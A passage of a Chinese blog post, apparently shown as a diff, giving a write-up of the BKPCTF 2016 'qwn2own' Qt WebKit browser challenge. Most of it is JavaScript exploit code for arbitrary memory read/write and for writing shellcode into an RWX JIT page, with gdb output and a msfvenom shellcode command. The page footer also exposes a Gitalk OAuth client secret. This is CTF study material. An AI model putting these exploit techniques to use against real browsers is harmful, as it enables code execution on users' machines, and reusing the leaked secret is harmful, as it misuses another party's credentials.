class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">str</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementById(<span class="string">"out"</span>).innerHTML+=str+<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//任意地址读</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			offset=addr-C_vec; <span class="comment">//计算读取地址和Cvector数组的距离</span></span><br><span class="line">			B.insert(B2C_index<span class="number">-1</span>,offset); <span class="comment">//修改offset为距离</span></span><br><span class="line">			info=C.get(<span class="number">0</span>); <span class="comment">//读取</span></span><br><span class="line">			<span class="keyword">if</span>(C.get(<span class="number">0</span>)==key2)	<span class="comment">//检测offset是否成功修改	</span></span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">B.insert(B2C_index<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">return</span> info;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1000</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">				<span class="keyword">var</span> db=BKPDataBase.create(<span class="string">"dbname"</span>,<span class="string">"passwd"</span>);</span><br><span class="line">				<span class="keyword">var</span> key1=<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1e12</span>); <span class="comment">//随机生成</span></span><br><span class="line">				<span class="keyword">var</span> key2=<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1e12</span>); </span><br><span class="line">				<span class="keyword">var</span> B=db.createStore(<span class="string">"B"</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xabc</span>);</span><br><span class="line">				<span class="keyword">var</span> C=db.createStore(<span class="string">"C"</span>,<span class="number">1</span>,[key2,<span class="number">0xbbbb</span>,<span class="number">0xdeadbeef</span>],key1);</span><br><span class="line">				B.remove(<span class="number">-1</span>);</span><br><span class="line">				B.insert(<span class="number">0</span>,<span class="number">0xffff000000001</span>);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">var</span> B2C_index=<span class="number">-1</span>; <span class="comment">//B-&gt;QArrayData数组 到 C -&gt;QArrayData 的距离</span></span><br><span class="line">				<span class="keyword">var</span> C_vec=<span class="number">-1</span>;<span class="comment">//C-&gt;QArrayData</span></span><br><span class="line">				<span class="keyword">var</span> vtable;</span><br><span class="line">				<span class="keyword">var</span> x=<span class="string">""</span>;</span><br><span class="line">				<span class="comment">//获取 C_vec地址</span></span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">2000</span> ;i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(B.get(i)==key1&amp;&amp;B.get(i<span class="number">-1</span>)==B.get(i<span class="number">-3</span>)&amp;&amp;C_vec==<span class="number">-1</span>)&#123;</span><br><span class="line">						C_vec=B.get(i<span class="number">-2</span>);</span><br><span class="line">						vtable=B.get(i<span class="number">-6</span>);</span><br><span class="line">						<span class="comment">//alert(vtable.toString(16));</span></span><br><span class="line">					&#125;	</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">2000</span> ;i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(B.get(i)==key2&amp;&amp;B.get(i+<span class="number">1</span>)==<span class="number">0xbbbb</span>&amp;&amp;B.get(i+<span class="number">2</span>)==<span class="number">0xdeadbeef</span>&amp;&amp;B2C_index==<span class="number">-1</span>)&#123;</span><br><span class="line">						B2C_index=i;</span><br><span class="line">					&#125;	</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(B2C_index!=<span class="number">-1</span>&amp;&amp;C_vec!=<span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					x=(<span class="string">"C_vec="</span>+C_vec.toString(<span class="number">16</span>)+<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">					x+=(<span class="string">"B2C_index="</span>+B2C_index.toString(<span class="number">16</span>)+<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">					<span class="keyword">if</span>(read(vtable)==<span class="literal">false</span>)</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					x+=<span class="string">"info="</span>+read(vtable).toString(<span class="number">16</span>); <span class="comment">//读取vtable的值</span></span><br><span class="line">					print(x);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	exploit();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ydW7KE.png" alt="ydW7KE"> </p>
+<p>Gdb attach到浏览器，查看虚函数表地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20xg 0x55f34f2ed400</span><br><span class="line">0x55f34f2ed400 &lt;_ZTV8BKPStore+16&gt;:	0x000055f34f0e8b80	0x000055f34f0e8eb0</span><br><span class="line">0x55f34f2ed410 &lt;_ZTV8BKPStore+32&gt;:	0x000055f34f0e8ff0	0x000055f34f0e93d0</span><br><span class="line">0x55f34f2ed420 &lt;_ZTV8BKPStore+48&gt;:	0x000055f34f0e9230	0x00007f7f7d357b10</span><br></pre></td></tr></table></figure>
+
+<p>同理任意地址写的代码只需把read函数的get换成insert</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">write</span><span class="params">(addr,content)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			offset=addr-C_vec;</span><br><span class="line">			B.insert(B2C_index<span class="number">-1</span>,offset); <span class="comment">//修改offset</span></span><br><span class="line">			<span class="keyword">if</span>(C.<span class="built_in">get</span>(<span class="number">0</span>)==key2)	<span class="comment">//检测offset是否成功修改	</span></span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			C.insert(<span class="number">0</span>,content);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过这里，任意地址写没办法修改虚函数表，会报段错误。</p>
+<p>修改程序流程只需要将vtable覆盖即可，不过这次的案例并不会覆盖虚表的方式，而会使用JIT Page的方式写入shellcode。</p>
+<p>漏洞分析完毕，下面开始写利用</p>
+<h3 id="2-2利用手法"><a href="#2-2利用手法" class="headerlink" title="2.2利用手法"></a>2.2利用手法</h3><p>看大佬的分析，主要两种利用方式</p>
+<p>1.传统的泄漏地址，绕过ASLR</p>
+<p>2.使用JIT Page写shellcode（JIT SPray）</p>
+<p>参考文献 <a href="https://www.usenix.org/sites/default/files/conference/protected-files/woot18_slides_gawlik.pdf" target="_blank" rel="noopener">https://www.usenix.org/sites/default/files/conference/protected-files/woot18_slides_gawlik.pdf</a></p>
+<p>[<a href="https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2%20-%20Alexey%20Sintsov%20-%20JIT%20Spray%20Attacks%20and%20Advanced%20Shellcode.pdf]" target="_blank" rel="noopener">https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2%20-%20Alexey%20Sintsov%20-%20JIT%20Spray%20Attacks%20and%20Advanced%20Shellcode.pdf]</a>(<a href="https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2" target="_blank" rel="noopener">https://conference.hitb.org/hitbsecconf2010ams/materials/D1T2</a> - Alexey Sintsov - JIT Spray Attacks and Advanced Shellcode.pdf)</p>
+<h4 id="JITPage写Shellcode"><a href="#JITPage写Shellcode" class="headerlink" title="JITPage写Shellcode"></a>JITPage写Shellcode</h4><p>Javascriptcore Heap（JIT Page所在Heap）和QT的Heap（QT用的libc堆）地址不在同一个堆中，所以需要在QT的heap中找到指向JIT Page的指针。</p>
+<p>首先在exploit开头创建一个func，并且循环调用。JIT会将循环多次的func转化为机器码以提高效率。将func的地址写入数组，并且以特定个格式存储，以便之后在内存查找func地址。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bab = <span class="string">"Migraine"</span>;</span><br><span class="line">		targeted = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">		        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">		                a = a^<span class="number">0x123456</span>^<span class="number">0x3eeee</span>;</span><br><span class="line">		                a= a^<span class="number">0x1666456</span>^<span class="number">0x3e66ee</span>;</span><br><span class="line">		        &#125;</span><br><span class="line">		        <span class="keyword">return</span> a^<span class="number">0x66666</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		_yol = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">20</span>);</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">		        _yol[i] = bab;</span><br><span class="line">				_yol[<span class="number">13</span>] = targeted;</span><br><span class="line">		</span><br><span class="line">		func_addr = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+
+<p>获取JIT page指针（实现任意地址读写之后）</p>
+<p>JIT指针内存，看到我们写入func被JIT编译为了机器码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(jimbo=C_vec;func_addr==<span class="literal">null</span>;jimbo=jimbo<span class="number">-8</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						chunksz=read(jimbo);</span><br><span class="line">						<span class="keyword">if</span>(chunksz&lt;=<span class="number">0x20</span>||(chunksz&amp;<span class="number">0xf1</span>)!=chunksz)</span><br><span class="line">							<span class="keyword">continue</span>;</span><br><span class="line">						chunksz = chunksz - chunksz &amp; <span class="number">1</span>;</span><br><span class="line">        				nextsz = read(jimbo+chunksz);</span><br><span class="line">        				<span class="keyword">if</span> (nextsz &lt; <span class="number">0x20</span> || (nextsz &amp; <span class="number">0xfff1</span>) != nextsz || (nextsz&amp;<span class="number">1</span>)!=<span class="number">1</span>)</span><br><span class="line">                			<span class="keyword">continue</span>;</span><br><span class="line">												heapaddr = read(jimbo+<span class="number">10</span>*<span class="number">8</span>);</span><br><span class="line">        				<span class="keyword">if</span> ((heapaddr &lt;= C_vec) || ((heapaddr &amp; <span class="number">0xfff</span>) != <span class="number">0</span>))</span><br><span class="line">               				 <span class="keyword">continue</span>;</span><br><span class="line">        				</span><br><span class="line">        				<span class="keyword">if</span> (heapaddr != read(jimbo + <span class="number">11</span>*<span class="number">8</span>))</span><br><span class="line">                			<span class="keyword">continue</span>;</span><br><span class="line">						</span><br><span class="line">						nbregions = read(jimbo+<span class="number">2</span>*<span class="number">8</span>);</span><br><span class="line">        				regsz = read(jimbo+<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">        				heapsz = read(jimbo + <span class="number">12</span>*<span class="number">8</span>);</span><br><span class="line">        				<span class="keyword">if</span> (nbregions != <span class="number">2</span> || ((heapsz &amp; <span class="number">0xfff</span>) != <span class="number">0</span>) || ((regsz &amp; <span class="number">0xfff</span>) != <span class="number">0</span>) || heapsz == <span class="number">0</span> || nbregions*regsz != heapsz)</span><br><span class="line">        				        <span class="keyword">continue</span>;</span><br><span class="line">						<span class="keyword">for</span> (i=<span class="number">8</span>;i&lt;heapsz;i+=<span class="number">8</span>) &#123;</span><br><span class="line">               				 babar = read(heapaddr + i);</span><br><span class="line">                		<span class="keyword">if</span> (babar &lt; C_vec) <span class="keyword">continue</span>;</span><br><span class="line">                			match = <span class="literal">true</span>;</span><br><span class="line">                		<span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;<span class="number">20</span>;j++) &#123;</span><br><span class="line">                     	   <span class="keyword">if</span> (((j == <span class="number">13</span>) &amp;&amp; (read(heapaddr + i + j*<span class="number">8</span>) == babar)) || ((j != <span class="number">13</span>) &amp;&amp; (read(heapaddr + i + j*<span class="number">8</span>) != babar))) &#123;</span><br><span class="line">                                match = <span class="literal">false</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        	&#125;</span><br><span class="line">                		&#125;</span><br><span class="line">                		<span class="keyword">if</span> (match == <span class="literal">true</span>) &#123;</span><br><span class="line">                     	   func_addr = read(heapaddr + i + <span class="number">13</span>*<span class="number">8</span>);</span><br><span class="line">                    	    <span class="keyword">break</span>;</span><br><span class="line">                		&#125;</span><br><span class="line">        			&#125;</span><br><span class="line">        					targeted(<span class="number">123</span>);</span><br><span class="line">        			        jit_ptr = read(func_addr + <span class="number">8</span>*<span class="number">3</span>) + <span class="number">8</span>*<span class="number">4</span>;</span><br><span class="line">        					jit_addr =read(jit_ptr);</span><br><span class="line">					&#125;</span><br><span class="line">        print(<span class="string">"func_addr="</span>+func_addr.toString(<span class="number">16</span>)+<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        print(<span class="string">"jit_addr="</span>+_addr.toString(<span class="number">16</span>)+<span class="string">"&lt;br&gt;"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>![image-20200123195339713](/Users/migraine/Library/Application Support/typora-user-images/image-20200123195339713.png) </p>
+<p>这里的JIT page是RWX，所以直接写shellcode就行。之后调用func就会执行shellcode。</p>
+<p>而不是通过覆盖指向JIT的Point来控制程序流。</p>
+<p>不过目前大多数引擎都支持了对JIT Page的防护，JIT Page程序没有写入和执行（除非call func）权限，就需要使用JIT Spray和JIT-ROP。</p>
+<p>![image-20200123195359719](/Users/migraine/Library/Application Support/typora-user-images/image-20200123195359719.png) </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">	write(jit_addr+i,shellcode.charCodeAt(i));</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//alert(1);//for attac</span></span><br><span class="line">targeted(<span class="number">123</span>);<span class="comment">//exploit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/cOHgZ4.png" alt="cOHgZ4"> </p>
+<h4 id="泄漏地址（留坑）"><a href="#泄漏地址（留坑）" class="headerlink" title="泄漏地址（留坑）"></a>泄漏地址（留坑）</h4><p><strong>获取qwn2own基地址</strong></p>
+<p>读者应该还记得，之前泄漏BKPStore结构时，我们能够leak虚函数表，因为vtable虚函数表在程序内的偏移是固定的，于qwn2own 基地址偏移0x2103F0.</p>
+<p>而stroe_ping-6的位置，存放这BKPStore的虚函数表（偏移0n16）</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/VW4NxY.png" alt="VW4NxY"> </p>
+<p>查看读取出的虚函数表</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/<span class="number">20</span> <span class="number">0x55a2cd227400</span>  （后又重新运行，导致vtable地址和图片不一致）</span><br><span class="line"><span class="number">0x55a2cd227400</span> &lt;_ZTV8BKPStore+<span class="number">16</span>&gt;:	<span class="number">0x000055a2cd022b80</span>	<span class="number">0x000055a2cd022eb0</span></span><br><span class="line"><span class="number">0x55a2cd227410</span> &lt;_ZTV8BKPStore+<span class="number">32</span>&gt;:	<span class="number">0x000055a2cd022ff0</span>	<span class="number">0x000055a2cd0233d0</span></span><br><span class="line"><span class="number">0x55a2cd227420</span> &lt;_ZTV8BKPStore+<span class="number">48</span>&gt;:	<span class="number">0x000055a2cd023230</span>	<span class="number">0x00007f1544ddbb10</span></span><br><span class="line"><span class="number">0x55a2cd227430</span> &lt;_ZTV8BKPStore+<span class="number">64</span>&gt;:	<span class="number">0x00007f1544dd7810</span>	<span class="number">0x00007f1544dd7820</span></span><br></pre></td></tr></table></figure>
+
+<p>获取Binary的Base_address之后，可以通过泄漏got表来计算各个模块的基地址，也可以使用DT_DEBUG获取(详见参考文献)</p>
+<blockquote>
+<p>留坑</p>
+</blockquote>
+<p><strong>实现_dl_runtime_resolve函数</strong></p>
+<p>dynamic段的定义（glibc/elf/elf.h）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword	d_tag;	&#x2F;&#x2F;8 byte		&#x2F;* Dynamic entry type *&#x2F;</span><br><span class="line">  Union &#x2F;&#x2F;联合类型 8 byte</span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;		&#x2F;* Integer value *&#x2F;</span><br><span class="line">      Elf64_Addr d_ptr;			&#x2F;* Address value *&#x2F;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;  &#x2F;&#x2F;16 byte</span><br><span class="line"></span><br><span class="line">&#x2F;* Legal values for d_tag (dynamic entry type).  *&#x2F;</span><br><span class="line"></span><br><span class="line">#define DT_NULL		0		&#x2F;* Marks end of dynamic section *&#x2F;</span><br><span class="line">#define DT_NEEDED	1		&#x2F;* Name of needed library *&#x2F;</span><br><span class="line">#define DT_STRTAB	5		&#x2F;* Address of string table *&#x2F;</span><br><span class="line">#define DT_SYMTAB	6		&#x2F;* Address of symbol table *&#x2F;</span><br><span class="line"></span><br><span class="line">gef➤  elfheader </span><br><span class="line">.dynsym &#x3D; 0x55a2cd0172e0</span><br><span class="line">.dynstr &#x3D; 0x55a2cd018738</span><br><span class="line">.gnu.version &#x3D; 0x55a2cd01a33c</span><br><span class="line">.gnu.version_r &#x3D; 0x55a2cd01a4f0</span><br><span class="line">.rela.dyn &#x3D; 0x55a2cd01a580</span><br><span class="line">.init &#x3D; 0x55a2cd01c2c0</span><br><span class="line">.plt &#x3D; 0x55a2cd01c2e0</span><br><span class="line">.plt.got &#x3D; 0x55a2cd01c2f0</span><br><span class="line">.text &#x3D; 0x55a2cd01c730</span><br><span class="line">.fini &#x3D; 0x55a2cd023aa4</span><br><span class="line">.rodata &#x3D; 0x55a2cd023ac0</span><br><span class="line">.eh_frame_hdr &#x3D; 0x55a2cd024898</span><br><span class="line">.eh_frame &#x3D; 0x55a2cd024c70</span><br><span class="line">.gcc_except_table &#x3D; 0x55a2cd026584</span><br><span class="line">.init_array &#x3D; 0x55a2cd227320</span><br><span class="line">.fini_array &#x3D; 0x55a2cd227330</span><br><span class="line">.jcr &#x3D; 0x55a2cd227338</span><br><span class="line">.data.rel.ro &#x3D; 0x55a2cd227340</span><br><span class="line">.dynamic &#x3D; 0x55a2cd227910</span><br><span class="line">.got &#x3D; 0x55a2cd227b50</span><br><span class="line">.data &#x3D; 0x55a2cd228000</span><br><span class="line">.bss &#x3D; 0x55a2cd228028</span><br></pre></td></tr></table></figure>
+
+<p>查看dynamic段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;40 0x55a2cd227910</span><br><span class="line">0x55a2cd227910:	0x0000000000000001	0x0000000000000001</span><br><span class="line">0x55a2cd227920:	0x0000000000000001	0x0000000000000ea7</span><br><span class="line">略</span><br><span class="line">0x55a2cd227a10:	0x0000000000000005 &lt;--d_tag&#x3D;5	0x000055a2cd018738 &lt;--STRTAB</span><br><span class="line">0x55a2cd227a20:	0x0000000000000006&lt;--d_tag&#x3D;6 	0x000055a2cd0172e0 &lt;--SYMTAB</span><br><span class="line">0x55a2cd227a30:	0x000000000000000a	0x0000000000001c03</span><br><span class="line">0x55a2cd227a40:	0x000000000000000b	0x0000000000000018</span><br></pre></td></tr></table></figure>
+
+<p>查看STRTAB</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20s  0x000055a2cd018738</span><br><span class="line">0x55a2cd018738:	&quot;&quot;</span><br><span class="line">0x55a2cd018739:	&quot;libQt5WebKitWidgets.so.5&quot;</span><br><span class="line">0x55a2cd018752:	&quot;__gmon_start__&quot;</span><br><span class="line">0x55a2cd018761:	&quot;_ITM_deregisterTMCloneTable&quot;</span><br><span class="line">0x55a2cd01877d:	&quot;_ITM_registerTMCloneTable&quot;</span><br><span class="line">0x55a2cd018797:	&quot;_Jv_RegisterClasses&quot;</span><br><span class="line">0x55a2cd0187ab:	&quot;_ZNK11QObjectData17dynamicMetaObjectEv&quot;</span><br><span class="line">0x55a2cd0187d2:	&quot;_ZN7QObject7connectEPKS_PKcS1_S3_N2Qt14ConnectionTypeE&quot;</span><br><span class="line">0x55a2cd018809:	&quot;_ZN11QMetaObject10ConnectionD1Ev&quot;</span><br><span class="line">0x55a2cd01882a:	&quot;_ZN4QUrlC1Ev&quot;</span><br><span class="line">0x55a2cd018837:	&quot;_ZN10QArrayData11shared_nullE&quot;</span><br><span class="line">0x55a2cd018855:	&quot;_ZN10QArrayData10deallocateEPS_mm&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>调试的新姿势整理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb命令</span><br><span class="line">at PID 附加到进程 </span><br><span class="line">elfheader 获取ELF的header信息</span><br><span class="line">查看进程内存</span><br><span class="line">cat &#x2F;proc&#x2F;&#96;pidof qwn2own&#96;&#x2F;maps</span><br><span class="line">查看二进制</span><br><span class="line">Xxd</span><br><span class="line">msf生成shellcode（弹计算器shell加DISPLAY）</span><br><span class="line">msf5 &gt; msfvenom -p linux&#x2F;x64&#x2F;exec CMD&#x3D;&#39;DISPLAY&#x3D;:0 gnome-calculator&#39; -f c&gt; shellcode</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p><a href="https://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16" target="_blank" rel="noopener">https://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16</a></p>
+<p><a href="http://v4kst1z.top/2019/01/25/qwn2own/#more" target="_blank" rel="noopener">http://v4kst1z.top/2019/01/25/qwn2own/#more</a></p>
+<p><a href="http://rk700.github.io/2015/04/09/dt_debug-read/" target="_blank" rel="noopener">http://rk700.github.io/2015/04/09/dt_debug-read/</a> </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/20/qwn2own/" data-id="ck5qoqfho0000wb2vdg6e83in"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/" rel="tag">浏览器</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/12/21/Shellcode-Write/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            一步步编写Shellcode
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/12/01/CVE-2012-1876/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">CVE-2012-1876</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '5ae4e05700db25ed5406',
+      clientSecret: '8a38a8cb845b0b6198a0c59cab9df498ac778343',
+      repo: 'migraine-sudo.github.io',
+      owner: 'migraine-sudo',
+      admin: ['migraine-sudo'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 Migraine</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/fujiang.jpg" alt="Migraine"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/tags">Tags</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
